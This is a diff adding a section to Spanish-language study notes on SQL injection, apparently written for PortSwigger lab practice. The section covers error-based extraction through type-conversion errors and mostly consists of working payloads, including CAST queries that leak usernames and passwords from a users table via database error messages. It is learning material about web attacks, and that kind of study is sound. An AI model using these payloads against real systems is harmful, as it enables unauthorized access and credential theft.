@@ -327,6 +327,53 @@ La principal diferencia es que aquí no es necesario convertir todos las variabl
 ' AND (SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'	
 ```
 <br><br> **Nota: Ctrl + click copia toda la columna de intruder**
+
+## Error Conversión de tipo de dato
+La intención de este tipo de error es mostrar la información sensible en el error, ya que se espera una salida como la siguiente:<br>
+` Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char `
+Si bien se puede realizar con `CAST()`  tambien se puede con `Converter`
+```
+CAST ( expression AS target_type [ ( length ) ] )
+SELECT CAST('1234' AS INT) AS Result;
+SELECT CONVERT ( target_type ( length ), expression )
+SELECT CONVERT(INT,'5678') AS Result;
+```
+### Requisitos base
+```
+Identificación de comportamiento de error des sintaxis
+Comilla simple '
+Comilla doble ''
+Ejecucción de comentarios '--
+Ejecucción de comentarios '--'
+Concatenación base
+||(SELECT '' )||
+Concatenación condicional
+AND (SELECT '')
+Identificar el número de parametros consultados
+||(Select NULL)||
+||(Select NULL, NULL)||
+AND (SELECT NULL)
+AND (SELECT NULL,NULL)
+AND 1=1
+AND 1=2
+```
+### Generación de error por conversión de tipo de dato
+```
+' AND CAST((SELECT 1) AS int)--     => Generar un error ya que espera un valor booleano, depues del AND se espera una respuesta boleana por lo que manda error
+' AND 1=CAST((SELECT 1) AS int)--   => Consulta con valor booleano, no debería de dar error ya que es una comparación int
+'||CAST((SELECT 1) AS int)||        => Otra forma de consulta, el error es de tipo de dato ya que espera un char en la cadena pero resive un int
+'||CAST((SELECT 1) AS int)||--      => Otra forma de consulta, con comentarios
+```
+### Consultas aplicadas
+```
+' AND 1=CAST((SELECT username FROM users) AS int)--          =>Consulta los usuarios, toma en cuenta la respuesta que espera si 1 o más filas
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--  => Limita la consulta a una sola fila
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--  => Cambia el parametro para consultar información sensible
+'||CAST((SELECT username FROM users limit 1) AS int)||'      =>Mi consulta es más corta
+```
+**NOTA: Es posible que la consulta se encuentre truncada por lo que puedes eliminar el valor de la cookie o hacer consultas más genericas**
+**NOTA:La intención de CAST es que la salida del error muestra la información sensible que es objetivo**
+
 # Final
 Cheat Sheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet
